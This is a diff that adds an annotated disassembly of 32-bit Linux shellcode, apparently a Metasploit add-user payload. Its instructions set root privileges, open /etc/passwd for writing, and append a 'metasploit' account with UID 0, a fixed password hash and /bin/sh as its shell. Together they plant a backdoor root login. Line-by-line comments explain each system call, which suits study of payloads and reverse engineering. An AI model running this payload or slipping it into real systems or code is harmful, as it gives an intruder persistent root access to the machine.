@@ -1,0 +1,57 @@
+00000000  31C9              xor ecx,ecx                                 ; zero out ecx
+00000002  89CB              mov ebx,ecx                                 ; zero out ebx
+00000004  6A46              push byte +0x46                             ; 0x46 = 70 = setreuid()
+00000006  58                pop eax                                     ; eax = 70
+00000007  CD80              int 0x80                                    ; setreuid (0, 0);
+
+00000009  6A05              push byte +0x5                              ; 5 = open()
+0000000B  58                pop eax                                     ; set eax to 5
+0000000C  31C9              xor ecx,ecx                                 ; zero out ecx
+0000000E  51                push ecx                                    ; NULL terminate string
+0000000F  6873737764        push dword 0x64777373                       ; "dwss"
+00000014  682F2F7061        push dword 0x61702f2f                       ; "ap//"
+00000019  682F657463        push dword 0x6374652f                       ; "cte/"
+0000001E  89E3              mov ebx,esp                                 ; pointer to "/etc//passwd"
+00000020  41                inc ecx                                     ; 0x0001 - O_WRONLY
+00000021  B504              mov ch,0x4                                  ; 0x0401 - O_NOCTTY
+00000023  CD80              int 0x80                                    ; open ("/etc//passwd", O_WRONLY | O_NOCTTY);
+
+00000025  93                xchg eax,ebx                                ; save fd created by open() in ebx
+00000026  E828000000        call dword 0x53                             ; go to TAG down below, 0x53
+
+;; 6d 65 74 61 73 70 6c 6f 69 74 3a 41 7a 2f 64 49 73 6a 34 70 34 49 52 63 3a 30 3a 30 3a 3a 2f 3a 2f 62 69 6e 2f 73 68
+;; m  e  t  a  s  p  l  o  i  t  :  A  z  /  d  I  s  j  4  p  4  I  R  c  :  0  :  0  :  :  /  :  /  b  i  n  /  s  h
+0000002B  6D                insd                                        ; m
+0000002C  657461            gs jz 0x90                                  ; e t a
+0000002F  7370              jnc 0xa1                                    ; s p
+00000031  6C                insb                                        ; l
+00000032  6F                outsd                                       ; o
+00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a    ; i t : z / d I
+0000003B  736A              jnc 0xa7                                    ; s j
+0000003D  3470              xor al,0x70                                 ; 4 p
+0000003F  3449              xor al,0x49                                 ; 4 I
+00000041  52                push edx                                    ; R
+00000042  633A              arpl [edx],di                               ; c :
+00000044  303A              xor [edx],bh                                ; 0 :
+00000046  303A              xor [edx],bh                                ; 0 :
+00000048  3A2F              cmp ch,[edi]                                ; : /
+0000004A  3A2F              cmp ch,[edi]                                ; : /
+0000004C  62696E            bound ebp,[ecx+0x6e]                        ; b i n
+0000004F  2F                das                                         ; /
+00000050  7368              jnc 0xba                                    ; s h
+00000052  0A598B            or bl,[ecx-0x75]                            ; 0x0a = newline
+;; TAG      ^^
+;; % perl -e 'print "\x59"' | ndisasm -b32 -
+;; % ndisasm -b 32 instruction 
+;; 00000000  59                pop ecx                                  ; address of string @ 0x2b
+
+;; % perl -e 'print "\x8b\x51\xfc"' | ndisasm -b32 -
+;; 00000000  8B51FC            mov edx,[ecx-0x4]                        ; ecx(0x2b) - 4 = 0x27 == 0x28 == 40 == length of string
+
+00000057  6A04              push byte +0x4                              ; set eax to 4
+00000059  58                pop eax                                     ; 4 = write()
+0000005A  CD80              int 0x80                                    ; write (fd, "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\n", 40);
+
+0000005C  6A01              push byte +0x1                              ; set eax to 1
+0000005E  58                pop eax                                     ; 1 = exit()
+0000005F  CD80              int 0x80                                    ; exit(fd)
